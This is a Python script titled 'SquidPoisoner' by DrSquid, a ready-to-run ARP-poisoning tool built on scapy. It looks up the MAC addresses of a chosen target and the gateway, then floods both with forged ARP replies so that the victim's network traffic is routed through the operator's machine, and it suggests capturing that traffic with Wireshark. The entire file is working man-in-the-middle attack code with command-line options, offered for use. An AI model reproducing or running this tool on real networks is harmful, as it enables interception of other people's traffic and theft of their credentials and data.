from optparse import OptionParser

class OptionParse:
    def __init__(self):
        self.logo()
        self.parse_args()
    def logo(self):
        print("""
  _____             _     _ _____      _                                  __   ___  
 / ____|           (_)   | |  __ \    (_)                                /_ | / _ \ 
| (___   __ _ _   _ _  __| | |__) |__  _ ___  ___  _ __   ___ _ __  __   _| || | | |
 \___ \ / _` | | | | |/ _` |  ___/ _ \| / __|/ _ \| '_ \ / _ \ '__| \ \ / / || | | |
 ____) | (_| | |_| | | (_| | |  | (_) | \__ \ (_) | | | |  __/ |     \ V /| || |_| |
|_____/ \__, |\__,_|_|\__,_|_|   \___/|_|___/\___/|_| |_|\___|_|      \_/ |_(_)___/ 
           | |                                                                      
           |_|    
ARP-Poisoner Script By DrSquid""")
    def usage(self):
        print("""
[+] Option-Parsing Help:
[+] -t, --target  - Specify the Target IP.
[+] -g, --gateway - Specify your default gateway IP.
[+] -i, --info    - Shows this message.

[+] Usage:""")
        if sys.argv[0].endswith(".py"):
            print("""[+] python3 SquidPoisoner.py -t <targetip> -g <gateway>
[+] python3 SquidPoisoner.py -i
            """)
        else:
            print("""[+] SquidPoisoner -t <targetip> -g <gateway>
[+] SquidPoisoner -i""")
    def parse_args(self):
        args = OptionParser()
        args.add_option("-t","--target", dest="target")
        args.add_option("-g","--gateway", dest="gateway")
        args.add_option("-i","--info",dest="info",action="store_true")
        opt, arg = args.parse_args()
        if opt.info is not None:
            self.usage()
            sys.exit()
        if opt.target is not None:
            target = opt.target
        else:
            self.usage()
            sys.exit()
        if opt.gateway is not None:
            gateway = opt.gateway
        else:
            gateway = "192.168.0.1"
        mitm = ARP_Poisoner(target, gateway)
        mitm.arp_poison()
class ARP_Poisoner:
    def __init__(self, targ_ip, gate_ip):
        self.targ_ip = targ_ip
        self.gate_ip = gate_ip
    def obtain_macaddress(self, ip):
        arpbroadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=ip)
        recv = srp(arpbroadcast, timeout=2, verbose=False)
        return recv[0][0][1].hwsrc
    def send_arp_pkt(self, targetip, targetmac, sourceip):
        packet = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
        send(packet, verbose=False)
    def restore_arp(self, targetip, targetmac, sourceip, sourcemac):
        packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
        send(packet, verbose=False)
        print(f"[+] ARP Table Restored For: {targetip}")
    def arp_poison(self):
        try:
            self.gate_mac = self.obtain_macaddress(self.gate_ip)
            print(f"[+] Gateway MAC: {self.gate_mac}")
        except:
            print(f"[+] Unable to Obtain MAC Address for {self.gate_ip}")
            sys.exit()
        try:
            self.targ_mac = self.obtain_macaddress(self.targ_ip)
            print(f"[+] Target MAC: {self.targ_mac}")
        except:
            print(f"[+] Unable to Obtain MAC Address for {self.targ_ip}")
            sys.exit()
        print("\n[+] Sending ARP-Poisoning Packets to Targets\n[+] Do CTRL+C To Stop Arp Poisoning.\n")
        print("[+] Be Aware that network traffic is being sent to you!\n[+] Use an external tool to check it out(like WireShark).")
        while True:
            try:
                self.send_arp_pkt(self.targ_ip, self.targ_mac, self.gate_ip)
                self.send_arp_pkt(self.gate_ip, self.gate_mac, self.targ_ip)
            except:
                print("")
                self.restore_arp(self.gate_ip, self.gate_mac, self.targ_ip, self.targ_mac)
                self.restore_arp(self.targ_ip, self.targ_mac, self.gate_ip, self.gate_mac)
                break
try:
    from scapy.all import *
except:
    OptionParse.logo(None)
    print("[+] Scapy is required to run this script.\n[+] Run this command if you have python: pip install scapy")
    sys.exit()
parser = OptionParse()